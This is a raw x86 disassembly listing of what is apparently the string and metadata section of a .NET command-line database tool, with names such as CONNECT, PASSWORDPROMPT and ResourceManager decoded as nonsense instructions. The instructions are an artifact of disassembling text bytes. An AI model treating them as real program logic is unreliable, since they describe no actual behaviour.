  4083e9:	outs   dx,DWORD PTR ds:[esi]
  4083ea:	outs   dx,BYTE PTR ds:[esi]
  4083eb:	je     0x40845f
  4083ed:	popa   
  4083ee:	arpl   WORD PTR [esi+ecx*2+0x61],si
  4083f2:	ins    DWORD PTR es:[edi],dx
  4083f3:	add    BYTE PTR gs:[ebx+0x74],dl
  4083f7:	popa   
  4083f8:	jb     0x40846e
  4083fa:	add    BYTE PTR [ecx+0x64],cl
  4083fd:	outs   dx,BYTE PTR gs:[esi]
  4083ff:	je     0x40846a
  408401:	imul   sp,WORD PTR [ebp+0x72],0x4300
  408407:	dec    edi
  408408:	dec    esi
  408409:	dec    esi
  40840a:	inc    ebp
  40840b:	inc    ebx
  40840c:	push   esp
  40840d:	add    BYTE PTR [edi+ecx*2+0x0],dl
  408411:	push   ebx
  408412:	ins    BYTE PTR es:[edi],dx
  408413:	popa   
  408414:	jae    0x40847e
  408416:	add    BYTE PTR [ecx+eiz*2+0x73],al
  40841a:	push   0x4c4d5800
  40841f:	add    BYTE PTR [ebp+eax*2+0x56],cl
  408423:	inc    ebp
  408424:	dec    esp
  408425:	add    BYTE PTR [ebp+0x52],al
  408428:	push   edx
  408429:	dec    edi
  40842a:	push   edx
  40842b:	add    BYTE PTR [edi+0x41],dl
  40842e:	push   edx
  40842f:	dec    esi
  408430:	dec    ecx
  408431:	dec    esi
  408432:	inc    edi
  408433:	add    BYTE PTR [ecx+0x4e],cl
  408436:	inc    esi
  408437:	dec    edi
  408438:	add    BYTE PTR [ebp+0x0],al
  40843b:	push   ebp
  40843c:	add    BYTE PTR [eax+0x0],dl
  40843f:	push   ebx
  408440:	add    BYTE PTR [eax+eax*1+0x6c],ah
  408444:	add    BYTE PTR [ebx+0x4f],al
  408447:	dec    esi
  408448:	inc    esi
  408449:	dec    ecx
  40844a:	inc    edi
  40844b:	push   ebp
  40844c:	push   edx
  40844d:	inc    ecx
  40844e:	push   esp
  40844f:	dec    ecx
  408450:	dec    edi
  408451:	dec    esi
  408452:	add    BYTE PTR [esi+0x52],al
  408455:	dec    edi
  408456:	dec    ebp
  408457:	add    BYTE PTR [ebx+0x45],dl
  40845a:	push   edx
  40845b:	push   esi
  40845c:	dec    ecx
  40845d:	inc    ebx
  40845e:	inc    ebp
  40845f:	add    BYTE PTR [ebx+0x4f],al
  408462:	dec    esi
  408463:	push   esp
  408464:	push   edx
  408465:	inc    ecx
  408466:	inc    ebx
  408467:	push   esp
  408468:	add    BYTE PTR [ebp+0x49],cl
  40846b:	push   edx
  40846c:	push   edx
  40846d:	dec    edi
  40846e:	push   edx
  40846f:	add    BYTE PTR [ebp+0x4e],al
  408472:	inc    ebx
  408473:	push   edx
  408474:	pop    ecx
  408475:	push   eax
  408476:	push   esp
  408477:	dec    ecx
  408478:	dec    edi
  408479:	dec    esi
  40847a:	add    BYTE PTR [edi+0x4e],cl
  40847d:	add    BYTE PTR [edi+0x46],cl
  408480:	inc    esi
  408481:	add    BYTE PTR [ecx+0x4e],al
  408484:	dec    edi
  408485:	dec    esi
  408486:	pop    ecx
  408487:	dec    ebp
  408488:	dec    edi
  408489:	push   ebp
  40848a:	push   ebx
  40848b:	add    BYTE PTR [ebx+0x6f],ah
  40848e:	ins    DWORD PTR es:[edi],dx
  40848f:	ins    DWORD PTR es:[edi],dx
  408490:	popa   
  408491:	add    BYTE PTR [edx+0x55],dl
  408494:	dec    esi
  408495:	push   esp
  408496:	dec    ecx
  408497:	dec    ebp
  408498:	inc    ebp
  408499:	add    BYTE PTR [ecx+0x4d],dl
  40849c:	popa   
  40849d:	jb     0x40850a
  40849f:	add    BYTE PTR [esi+0x45],cl
  4084a2:	push   edi
  4084a3:	add    BYTE PTR [ecx+0x44],cl
  4084a6:	add    BYTE PTR [ecx+ecx*2+0x4d],dl
  4084aa:	inc    ebp
  4084ab:	dec    edi
  4084ac:	push   ebp
  4084ad:	push   esp
  4084ae:	add    BYTE PTR [ecx+0x47],cl
  4084b1:	dec    esi
  4084b2:	dec    edi
  4084b3:	push   edx
  4084b4:	inc    ebp
  4084b5:	add    BYTE PTR [ebx+0x48],dl
  4084b8:	dec    edi
  4084b9:	push   edi
  4084ba:	inc    ebp
  4084bb:	push   esi
  4084bc:	inc    ebp
  4084bd:	dec    esi
  4084be:	push   esp
  4084bf:	push   ebx
  4084c0:	add    BYTE PTR [ecx+0x72],al
  4084c3:	add    BYTE PTR [si+0x6f],dl
  4084c7:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4084cb:	pop    edi
  4084cc:	outs   dx,BYTE PTR ds:[esi]
  4084cd:	gs ja  0x4084d0
  4084d0:	addr16 gs je 0x408533
  4084d4:	dec    esi
  4084d5:	gs ja  0x4084d8
  4084d8:	pop    edi
  4084d9:	jae    0x408543
  4084db:	outs   dx,DWORD PTR ds:[esi]
  4084dc:	ja     0x408523
  4084de:	jbe    0x408545
  4084e0:	outs   dx,BYTE PTR ds:[esi]
  4084e1:	je     0x408556
  4084e3:	add    BYTE PTR [edi+0x65],ah
  4084e6:	je     0x408547
  4084e8:	push   ebx
  4084e9:	push   0x7645776f
  4084ee:	outs   dx,BYTE PTR gs:[esi]
  4084f0:	je     0x408565
  4084f2:	add    BYTE PTR [ecx+ebp*2+0x73],cl
  4084f6:	je     0x408558
  4084f8:	xor    DWORD PTR [eax],eax
  4084fa:	inc    edi
  4084fb:	jne    0x408566
  4084fd:	add    BYTE PTR fs:[edi+0x69],bl
  408501:	fs jae 0x408504
  408504:	addr16 gs je 0x408567
  408508:	dec    ecx
  408509:	inc    esp
  40850a:	push   ebx
  40850b:	add    BYTE PTR [edi+0x63],bl
  40850e:	outs   dx,DWORD PTR ds:[esi]
  40850f:	outs   dx,BYTE PTR ds:[esi]
  408510:	outs   dx,BYTE PTR ds:[esi]
  408511:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408516:	outs   dx,BYTE PTR ds:[esi]
  408517:	jae    0x408519
  408519:	addr16 gs je 0x40857c
  40851d:	inc    ebx
  40851e:	outs   dx,DWORD PTR ds:[esi]
  40851f:	outs   dx,BYTE PTR ds:[esi]
  408520:	outs   dx,BYTE PTR ds:[esi]
  408521:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408526:	outs   dx,BYTE PTR ds:[esi]
  408527:	jae    0x408529
  408529:	push   esp
  40852a:	imul   ebp,DWORD PTR [ebp+0x65],0x6e617053
  408531:	add    BYTE PTR [edi+0x74],bl
  408534:	imul   ebp,DWORD PTR [ebp+0x65],0x74756f
  40853b:	addr16 gs je 0x40859e
  40853f:	push   esp
  408540:	imul   ebp,DWORD PTR [ebp+0x65],0x74756f
  408547:	dec    esi
  408548:	gs ja  0x40854b
  40854b:	push   ebx
  40854c:	push   0x7645776f
  408551:	outs   dx,BYTE PTR gs:[esi]
  408553:	je     0x4085c8
  408555:	add    BYTE PTR [ecx+0x44],cl
  408558:	push   ebx
  408559:	add    BYTE PTR [ebx+0x6f],al
  40855c:	outs   dx,BYTE PTR ds:[esi]
  40855d:	outs   dx,BYTE PTR ds:[esi]
  40855e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408563:	outs   dx,BYTE PTR ds:[esi]
  408564:	jae    0x408566
  408566:	pop    edi
  408567:	jae    0x4085ce
  408569:	jb     0x4085e1
  40856b:	imul   esp,DWORD PTR [ebx+0x65],0x656d614e
  408572:	add    BYTE PTR [edi+0x65],ah
  408575:	je     0x4085d6
  408577:	push   ebx
  408578:	gs jb  0x4085f1
  40857b:	imul   esp,DWORD PTR [ebx+0x65],0x656d614e
  408582:	add    BYTE PTR [edi+0x62],bl
  408585:	jb     0x4085f6
  408587:	imul   esp,DWORD PTR [ebp+0x72],0x49
  40858b:	outs   dx,BYTE PTR ds:[esi]
  40858c:	jae    0x408602
  40858e:	popa   
  40858f:	outs   dx,BYTE PTR ds:[esi]
  408590:	arpl   WORD PTR [ebp+0x0],sp
  408593:	addr16 gs je 0x4085f6
  408597:	inc    edx
  408598:	jb     0x408609
  40859a:	imul   esp,DWORD PTR [ebp+0x72],0x49
  40859e:	outs   dx,BYTE PTR ds:[esi]
  40859f:	jae    0x408615
  4085a1:	popa   
  4085a2:	outs   dx,BYTE PTR ds:[esi]
  4085a3:	arpl   WORD PTR [ebp+0x0],sp
  4085a6:	pop    edi
  4085a7:	ins    DWORD PTR es:[edi],dx
  4085a8:	imul   esi,DWORD PTR [edx+0x72],0x6700726f
  4085af:	gs je  0x408611
  4085b2:	dec    ebp
  4085b3:	imul   esi,DWORD PTR [edx+0x72],0x5300726f
  4085ba:	gs jb  0x408633
  4085bd:	imul   esp,DWORD PTR [ebx+0x65],0x656d614e
  4085c4:	add    BYTE PTR [edx+0x72],al
  4085c7:	outs   dx,DWORD PTR ds:[esi]
  4085c8:	imul   esp,DWORD PTR [ebp+0x72],0x49
  4085cc:	outs   dx,BYTE PTR ds:[esi]
  4085cd:	jae    0x408643
  4085cf:	popa   
  4085d0:	outs   dx,BYTE PTR ds:[esi]
  4085d1:	arpl   WORD PTR [ebp+0x0],sp
  4085d4:	dec    ebp
  4085d5:	imul   esi,DWORD PTR [edx+0x72],0x5300726f
  4085dc:	jns    0x408651
  4085de:	je     0x408645
  4085e0:	ins    DWORD PTR es:[edi],dx
  4085e1:	cs push edx
  4085e3:	gs jae 0x408655
  4085e6:	jne    0x40865a
  4085e8:	arpl   WORD PTR [ebp+0x73],sp
  4085eb:	add    BYTE PTR [edx+0x65],dl
  4085ee:	jae    0x40865f
  4085f0:	jne    0x408664
  4085f2:	arpl   WORD PTR [ebp+0x4d],sp
  4085f5:	popa   
  4085f6:	outs   dx,BYTE PTR ds:[esi]
  4085f7:	popa   
  4085f8:	addr16 gs jb 0x4085fc
  4085fc:	jb     0x408663
  4085fe:	jae    0x40866f
  408600:	jne    0x408674
  408602:	arpl   WORD PTR [ebp+0x4d],sp
  408605:	popa   
  408606:	outs   dx,BYTE PTR ds:[esi]
  408607:	add    BYTE PTR [ebx+0x79],dl
  40860a:	jae    0x408680
  40860c:	gs ins DWORD PTR es:[edi],dx
  40860e:	cs inc edi
  408610:	ins    BYTE PTR es:[edi],dx
  408611:	outs   dx,DWORD PTR ds:[esi]
  408612:	bound  esp,QWORD PTR [ecx+0x6c]
  408615:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  40861c:	add    BYTE PTR [ebx+0x75],al
  40861f:	ins    BYTE PTR es:[edi],dx
  408620:	je     0x408697
  408622:	jb     0x408689
  408624:	dec    ecx
  408625:	outs   dx,BYTE PTR ds:[esi]
  408626:	outs   dx,WORD PTR ds:[esi]
  408628:	add    BYTE PTR [edx+0x65],dh
  40862b:	jae    0x40869c
  40862d:	jne    0x4086a1
  40862f:	arpl   WORD PTR [ebp+0x43],sp
  408632:	jne    0x4086a0
  408634:	je     0x4086ab
  408636:	jb     0x40869d
  408638:	add    BYTE PTR [edi+0x65],ah
  40863b:	je     0x40869c
  40863d:	push   edx
  40863e:	gs jae 0x4086b0
  408641:	jne    0x4086b5
  408643:	arpl   WORD PTR [ebp+0x4d],sp
  408646:	popa   
  408647:	outs   dx,BYTE PTR ds:[esi]
  408648:	popa   
  408649:	addr16 gs jb 0x40864d
  40864d:	addr16 gs je 0x4086b0
  408651:	inc    ebx
  408652:	jne    0x4086c0
  408654:	je     0x4086cb
  408656:	jb     0x4086bd
  408658:	add    BYTE PTR [ebx+0x65],dh
  40865b:	je     0x4086bc
  40865d:	inc    ebx
  40865e:	jne    0x4086cc
  408660:	je     0x4086d7
  408662:	jb     0x4086c9
  408664:	add    BYTE PTR [edi+0x65],ah
  408667:	je     0x4086c8
  408669:	inc    edx
  40866a:	inc    ecx
  40866b:	inc    esp
  40866c:	inc    ecx
  40866d:	push   edx
  40866e:	inc    edi
  40866f:	push   ebp
  408670:	dec    ebp
  408671:	inc    ebp
  408672:	push   esp
  408673:	pop    edi
  408674:	inc    esp
  408675:	inc    edx
  408676:	dec    esi
  408677:	inc    ecx
  408678:	dec    ebp
  408679:	inc    ebp
  40867a:	add    BYTE PTR [edi+0x65],ah
  40867d:	je     0x4086de
  40867f:	dec    eax
  408680:	inc    ebp
  408681:	dec    esp
  408682:	push   eax
  408683:	push   esp
  408684:	inc    ebp
  408685:	pop    eax
  408686:	push   esp
  408687:	pop    edi
  408688:	inc    ebx
  408689:	push   ebp
  40868a:	dec    esp
  40868b:	push   esp
  40868c:	push   ebp
  40868d:	push   edx
  40868e:	inc    ebp
  40868f:	pop    edi
  408690:	inc    esp
  408691:	inc    ebp
  408692:	push   eax
  408693:	inc    ebp
  408694:	dec    esi
  408695:	inc    esp
  408696:	inc    ebp
  408697:	dec    esi
  408698:	push   esp
  408699:	add    BYTE PTR [edi+0x65],ah
  40869c:	je     0x4086fd
  40869e:	inc    ebp
  40869f:	push   esi
  4086a0:	inc    ebp
  4086a1:	dec    esi
  4086a2:	push   esp
  4086a3:	push   ebx
  4086a4:	inc    ebx
  4086a5:	dec    edi
  4086a6:	push   ebp
  4086a7:	dec    esi
  4086a8:	push   esp
  4086a9:	add    BYTE PTR [edi+0x65],ah
  4086ac:	je     0x40870d
  4086ae:	inc    ebp
  4086af:	push   esi
  4086b0:	inc    ebp
  4086b1:	dec    esi
  4086b2:	push   esp
  4086b3:	push   ebx
  4086b4:	inc    ebx
  4086b5:	dec    edi
  4086b6:	push   ebp
  4086b7:	dec    esi
  4086b8:	push   esp
  4086b9:	dec    ecx
  4086ba:	inc    edi
  4086bb:	dec    esi
  4086bc:	dec    edi
  4086bd:	push   edx
  4086be:	inc    ebp
  4086bf:	inc    esp
  4086c0:	add    BYTE PTR [edi+0x65],ah
  4086c3:	je     0x408724
  4086c5:	dec    ecx
  4086c6:	dec    esi
  4086c7:	push   esp
  4086c8:	inc    ebp
  4086c9:	push   edx
  4086ca:	dec    esi
  4086cb:	inc    ecx
  4086cc:	dec    esp
  4086cd:	inc    ebp
  4086ce:	pop    eax
  4086cf:	inc    ebx
  4086d0:	inc    ebp
  4086d1:	push   eax
  4086d2:	push   esp
  4086d3:	dec    ecx
  4086d4:	dec    edi
  4086d5:	dec    esi
  4086d6:	add    BYTE PTR [edi+0x65],ah
  4086d9:	je     0x40873a
  4086db:	dec    ecx
  4086dc:	dec    esi
  4086dd:	push   esp
  4086de:	inc    ebp
  4086df:	push   edx
  4086e0:	dec    esi
  4086e1:	inc    ecx
  4086e2:	dec    esp
  4086e3:	inc    ebp
  4086e4:	pop    eax
  4086e5:	inc    ebx
  4086e6:	inc    ebp
  4086e7:	push   eax
  4086e8:	push   esp
  4086e9:	dec    ecx
  4086ea:	dec    edi
  4086eb:	dec    esi
  4086ec:	pop    edi
  4086ed:	push   ebx
  4086ee:	push   ecx
  4086ef:	dec    esp
  4086f0:	add    BYTE PTR [edi+0x65],ah
  4086f3:	je     0x408754
  4086f5:	dec    ebp
  4086f6:	dec    ecx
  4086f7:	push   ebx
  4086f8:	push   ebx
  4086f9:	dec    ecx
  4086fa:	dec    esi
  4086fb:	inc    edi
  4086fc:	dec    edi
  4086fd:	push   eax
  4086fe:	push   esp
  4086ff:	dec    ecx
  408700:	dec    edi
  408701:	dec    esi
  408702:	add    BYTE PTR [edi+0x65],ah
  408705:	je     0x408766
  408707:	push   eax
  408708:	inc    ecx
  408709:	push   ebx
  40870a:	push   ebx
  40870b:	push   edi
  40870c:	dec    edi
  40870d:	push   edx
  40870e:	inc    esp
  40870f:	push   eax
  408710:	push   edx
  408711:	dec    edi
  408712:	dec    ebp
  408713:	push   eax
  408714:	push   esp
  408715:	add    BYTE PTR [edi+0x65],ah
  408718:	je     0x408779
  40871a:	push   ebp
  40871b:	dec    esi
  40871c:	push   edx
  40871d:	inc    ebp
  40871e:	inc    ebx
  40871f:	dec    edi
  408720:	inc    edi
  408721:	dec    esi
  408722:	dec    ecx
  408723:	pop    edx
  408724:	inc    ebp
  408725:	inc    esp
  408726:	dec    edi
  408727:	push   eax
  408728:	push   esp
  408729:	dec    ecx
  40872a:	dec    edi
  40872b:	dec    esi
  40872c:	add    BYTE PTR [ebx+0x75],al
  40872f:	ins    BYTE PTR es:[edi],dx
  408730:	je     0x4087a7
  408732:	jb     0x408799
  408734:	add    BYTE PTR [edx+0x41],al
  408737:	inc    esp
  408738:	inc    ecx
  408739:	push   edx
  40873a:	inc    edi
  40873b:	push   ebp
  40873c:	dec    ebp
  40873d:	inc    ebp
  40873e:	push   esp
  40873f:	pop    edi
  408740:	inc    esp
  408741:	inc    edx
  408742:	dec    esi
  408743:	inc    ecx
  408744:	dec    ebp
  408745:	inc    ebp
  408746:	add    BYTE PTR [eax+0x45],cl
  408749:	dec    esp
  40874a:	push   eax
  40874b:	push   esp
  40874c:	inc    ebp
  40874d:	pop    eax
  40874e:	push   esp
  40874f:	pop    edi
  408750:	inc    ebx
  408751:	push   ebp
  408752:	dec    esp
  408753:	push   esp
  408754:	push   ebp
  408755:	push   edx
  408756:	inc    ebp
  408757:	pop    edi
  408758:	inc    esp
  408759:	inc    ebp
  40875a:	push   eax
  40875b:	inc    ebp
  40875c:	dec    esi
  40875d:	inc    esp
  40875e:	inc    ebp
  40875f:	dec    esi
  408760:	push   esp
  408761:	add    BYTE PTR [ebp+0x56],al
  408764:	inc    ebp
  408765:	dec    esi
  408766:	push   esp
  408767:	push   ebx
  408768:	inc    ebx
  408769:	dec    edi
  40876a:	push   ebp
  40876b:	dec    esi
  40876c:	push   esp
  40876d:	add    BYTE PTR [ebp+0x56],al
  408770:	inc    ebp
  408771:	dec    esi
  408772:	push   esp
  408773:	push   ebx
  408774:	inc    ebx
  408775:	dec    edi
  408776:	push   ebp
  408777:	dec    esi
  408778:	push   esp
  408779:	dec    ecx
  40877a:	inc    edi
  40877b:	dec    esi
  40877c:	dec    edi
  40877d:	push   edx
  40877e:	inc    ebp
  40877f:	inc    esp
  408780:	add    BYTE PTR [ecx+0x4e],cl
  408783:	push   esp
  408784:	inc    ebp
  408785:	push   edx
  408786:	dec    esi
  408787:	inc    ecx
  408788:	dec    esp
  408789:	inc    ebp
  40878a:	pop    eax
  40878b:	inc    ebx
  40878c:	inc    ebp
  40878d:	push   eax
  40878e:	push   esp
  40878f:	dec    ecx
  408790:	dec    edi
  408791:	dec    esi
  408792:	add    BYTE PTR [ecx+0x4e],cl
  408795:	push   esp
  408796:	inc    ebp
  408797:	push   edx
  408798:	dec    esi
  408799:	inc    ecx
  40879a:	dec    esp
  40879b:	inc    ebp
  40879c:	pop    eax
  40879d:	inc    ebx
  40879e:	inc    ebp
  40879f:	push   eax
  4087a0:	push   esp
  4087a1:	dec    ecx
  4087a2:	dec    edi
  4087a3:	dec    esi
  4087a4:	pop    edi
  4087a5:	push   ebx
  4087a6:	push   ecx
  4087a7:	dec    esp
  4087a8:	add    BYTE PTR [ebp+0x49],cl
  4087ab:	push   ebx
  4087ac:	push   ebx
  4087ad:	dec    ecx
  4087ae:	dec    esi
  4087af:	inc    edi
  4087b0:	dec    edi
  4087b1:	push   eax
  4087b2:	push   esp
  4087b3:	dec    ecx
  4087b4:	dec    edi
  4087b5:	dec    esi
  4087b6:	add    BYTE PTR [eax+0x41],dl
  4087b9:	push   ebx
  4087ba:	push   ebx
  4087bb:	push   edi
  4087bc:	dec    edi
  4087bd:	push   edx
  4087be:	inc    esp
  4087bf:	push   eax
  4087c0:	push   edx
  4087c1:	dec    edi
  4087c2:	dec    ebp
  4087c3:	push   eax
  4087c4:	push   esp
  4087c5:	add    BYTE PTR [ebp+0x4e],dl
  4087c8:	push   edx
  4087c9:	inc    ebp
  4087ca:	inc    ebx
  4087cb:	dec    edi
  4087cc:	inc    edi
  4087cd:	dec    esi
  4087ce:	dec    ecx
  4087cf:	pop    edx
  4087d0:	inc    ebp
  4087d1:	inc    esp
  4087d2:	dec    edi
  4087d3:	push   eax
  4087d4:	push   esp
  4087d5:	dec    ecx
  4087d6:	dec    edi
  4087d7:	dec    esi
  4087d8:	add    BYTE PTR [ecx+0x72],ah
  4087db:	addr16 jae 0x4087de
  4087de:	jo     0x408841
  4087e0:	jb     0x408855
  4087e2:	gs jb  0x4087e5
  4087e5:	outs   dx,BYTE PTR gs:[esi]
  4087e7:	imul   ebp,DWORD PTR [bp+0x65],0x6e6f6300
  4087ef:	outs   dx,BYTE PTR ds:[esi]
  4087f0:	push   ebx
  4087f1:	je     0x408865
  4087f3:	imul   ebp,DWORD PTR [esi+0x67],0x72657300
  4087fa:	jbe    0x408861
  4087fc:	jb     0x4087fe
  4087fe:	push   ebx
  4087ff:	jns    0x408874
  408801:	je     0x408868
  408803:	ins    DWORD PTR es:[edi],dx
  408804:	cs push edx
  408806:	jne    0x408876
  408808:	je     0x408873
  40880a:	ins    DWORD PTR es:[edi],dx
  40880b:	gs cs dec ecx
  40880e:	outs   dx,BYTE PTR ds:[esi]
  40880f:	je     0x408876
  408811:	jb     0x408882
  408813:	jo     0x408868
  408815:	gs jb  0x40888e
  408818:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  40881f:	je     0x408862
  408821:	je     0x408897
  408823:	jb     0x40888e
  408825:	bound  esi,QWORD PTR [ebp+0x74]
  408828:	add    BYTE PTR gs:[edx+eiz*2+0x0],ah
  40882d:	add    BYTE PTR gs:[esi+0x53],ah
  408831:	jne    0x4088a3
  408833:	jo     0x4088a7
  408835:	gs jae 0x4088ab
  408838:	gs add BYTE PTR fs:[ebx+0x65],dh
  40883d:	outs   dx,BYTE PTR ds:[esi]
  40883e:	fs gs jb 0x408842
  408842:	jbe    0x4088a5
  408844:	ins    BYTE PTR es:[edi],dx
  408845:	jne    0x4088ac
  408847:	add    BYTE PTR [ebx+0x6f],ah
  40884a:	fs add BYTE PTR gs:[esi+0x53],ch
  40884f:	je     0x4088b5
  408851:	dec    eax
  408852:	popa   
  408853:	outs   dx,BYTE PTR ds:[esi]
  408854:	fs ins BYTE PTR es:[edi],dx
  408856:	add    BYTE PTR gs:[eax+0x43],ch
  40885a:	outs   dx,DWORD PTR ds:[esi]
  40885b:	outs   dx,BYTE PTR ds:[esi]
  40885c:	jae    0x4088cd
  40885e:	ins    BYTE PTR es:[edi],dx
  40885f:	gs dec eax
  408861:	popa   
  408862:	outs   dx,BYTE PTR ds:[esi]
  408863:	fs ins BYTE PTR es:[edi],dx
  408865:	add    BYTE PTR gs:[eax+esi*2+0x4d],ch
  40886a:	outs   dx,DWORD PTR ds:[esi]
  40886b:	fs add BYTE PTR gs:[edi+esi*2+0x4d],ah
  408871:	outs   dx,DWORD PTR ds:[esi]
  408872:	fs add BYTE PTR gs:[ebx+0x6f],ah
  408877:	outs   dx,BYTE PTR ds:[esi]
  408878:	outs   dx,BYTE PTR ds:[esi]
  408879:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40887e:	outs   dx,BYTE PTR ds:[esi]
  40887f:	dec    edi
  408880:	jo     0x4088f6
  408882:	imul   ebp,DWORD PTR [edi+0x6e],0x65670073
  408889:	outs   dx,BYTE PTR ds:[esi]
  40888a:	gs jb  0x4088ee
  40888d:	ins    BYTE PTR es:[edi],dx
  40888e:	dec    edi
  40888f:	jo     0x408905
  408891:	imul   ebp,DWORD PTR [edi+0x6e],0x61640073
  408898:	je     0x4088fb
  40889a:	push   ebx
  40889b:	outs   dx,DWORD PTR ds:[esi]
  40889c:	jne    0x408910
  40889e:	arpl   WORD PTR [ebp+0x0],sp
  4088a1:	popa   
  4088a2:	jb     0x40890b
  4088a4:	add    BYTE PTR [edi+ebp*2+0x6b],dh
  4088a8:	outs   dx,BYTE PTR gs:[esi]
  4088aa:	add    BYTE PTR [ebx+0x74],dh
  4088ad:	popa   
  4088ae:	je     0x408915
  4088b0:	add    BYTE PTR [edx+0x75],dh
  4088b3:	outs   dx,BYTE PTR ds:[esi]
  4088b4:	je     0x40891f
  4088b6:	ins    DWORD PTR es:[edi],dx
  4088b7:	gs push ebx
  4088b9:	je     0x40891c
  4088bb:	je     0x408922
  4088bd:	add    BYTE PTR [ebx+0x6f],ah
  4088c0:	outs   dx,BYTE PTR ds:[esi]
  4088c1:	outs   dx,BYTE PTR ds:[esi]
  4088c2:	push   ebx
  4088c3:	je     0x408926
  4088c5:	je     0x40892c
  4088c7:	add    BYTE PTR [ebx+0x6f],ah
  4088ca:	outs   dx,BYTE PTR ds:[esi]
  4088cb:	outs   dx,BYTE PTR ds:[esi]
  4088cc:	dec    edi
  4088cd:	jo     0x408943
  4088cf:	imul   ebp,DWORD PTR [edi+0x6e],0x6f630073
  4088d6:	outs   dx,BYTE PTR ds:[esi]
  4088d7:	push   bx
  4088d9:	je     0x40893c
  4088db:	je     0x408942
  4088dd:	add    BYTE PTR [ebp+0x78],ah
  4088e0:	jo     0x408947
  4088e2:	arpl   WORD PTR [ebp+eiz*2+0x64],si
  4088e6:	add    BYTE PTR [ecx+0x63],ah
  4088e9:	je     0x408960
  4088eb:	popa   
  4088ec:	ins    BYTE PTR es:[edi],dx
  4088ed:	add    BYTE PTR [edi+0x65],ah
  4088f0:	outs   dx,BYTE PTR ds:[esi]
  4088f1:	gs jb  0x408955
  4088f4:	ins    BYTE PTR es:[edi],dx
  4088f5:	push   ebx
  4088f6:	je     0x408959
  4088f8:	je     0x40895f
  4088fa:	add    BYTE PTR [ebx+0x6f],al
  4088fd:	ins    DWORD PTR es:[edi],dx
  4088fe:	push   esi
  4088ff:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  408906:	je     0x40897c
  408908:	jb     0x408973
  40890a:	bound  esi,QWORD PTR [ebp+0x74]
  40890d:	add    BYTE PTR gs:[ebx+0x79],dl
  408911:	jae    0x408987
  408913:	gs ins DWORD PTR es:[edi],dx
  408915:	cs push edx
  408917:	gs data16 ins BYTE PTR es:[edi],dx
  40891a:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40891f:	outs   dx,BYTE PTR ds:[esi]
  408920:	add    BYTE PTR [ecx+0x73],al
  408923:	jae    0x40898a
  408925:	ins    DWORD PTR es:[edi],dx
  408926:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  40892a:	gs jb  0x4089a0
  40892d:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  408934:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40893b:	jae    0x4089b0
  40893d:	gs ins DWORD PTR es:[edi],dx
  40893f:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  408943:	jb     0x4089b4
  408945:	fs jne 0x4089ab
  408948:	je     0x40898b
  40894a:	je     0x4089c0
  40894c:	jb     0x4089b7
  40894e:	bound  esi,QWORD PTR [ebp+0x74]
  408951:	add    BYTE PTR gs:[ecx+0x73],al
  408955:	jae    0x4089bc
  408957:	ins    DWORD PTR es:[edi],dx
  408958:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40895c:	outs   dx,DWORD PTR ds:[esi]
  40895d:	jo     0x4089d8
  40895f:	jb     0x4089ca
  408961:	addr16 push 0x74744174
  408967:	jb     0x4089d2
  408969:	bound  esi,QWORD PTR [ebp+0x74]
  40896c:	add    BYTE PTR gs:[ecx+0x73],al
  408970:	jae    0x4089d7
  408972:	ins    DWORD PTR es:[edi],dx
  408973:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  408977:	outs   dx,DWORD PTR ds:[esi]
  408978:	ins    DWORD PTR es:[edi],dx
  408979:	jo     0x4089dc
  40897b:	outs   dx,BYTE PTR ds:[esi]
  40897c:	jns    0x4089bf
  40897e:	je     0x4089f4
  408980:	jb     0x4089eb
  408982:	bound  esi,QWORD PTR [ebp+0x74]
  408985:	add    BYTE PTR gs:[ecx+0x73],al
  408989:	jae    0x4089f0
  40898b:	ins    DWORD PTR es:[edi],dx
  40898c:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  408990:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  408998:	outs   dx,DWORD PTR ds:[esi]
  408999:	outs   dx,BYTE PTR ds:[esi]
  40899a:	inc    ecx
  40899b:	je     0x408a11
  40899d:	jb     0x408a08
  40899f:	bound  esi,QWORD PTR [ebp+0x74]
  4089a2:	add    BYTE PTR gs:[ecx+0x73],al
  4089a6:	jae    0x408a0d
  4089a8:	ins    DWORD PTR es:[edi],dx
  4089a9:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4089ad:	outs   dx,BYTE PTR ds:[esi]
  4089ae:	outs   dx,WORD PTR ds:[esi]
  4089b0:	jb     0x408a1f
  4089b2:	popa   
  4089b3:	je     0x408a1e
  4089b5:	outs   dx,DWORD PTR ds:[esi]
  4089b6:	outs   dx,BYTE PTR ds:[esi]
  4089b7:	popa   
  4089b8:	ins    BYTE PTR es:[edi],dx
  4089b9:	push   esi
  4089ba:	gs jb  0x408a30
  4089bd:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4089c4:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4089cb:	jae    0x408a40
  4089cd:	gs ins DWORD PTR es:[edi],dx
  4089cf:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  4089d3:	gs jns 0x408a1c
  4089d6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4089de:	bound  esi,QWORD PTR [ebp+0x74]
  4089e1:	add    BYTE PTR gs:[ecx+0x73],al
  4089e5:	jae    0x408a4c
  4089e7:	ins    DWORD PTR es:[edi],dx
  4089e8:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  4089ec:	gs ins BYTE PTR es:[edi],dx
  4089ee:	popa   
  4089ef:	jns    0x408a44
  4089f1:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  4089f8:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4089ff:	jae    0x408a74
  408a01:	gs ins DWORD PTR es:[edi],dx
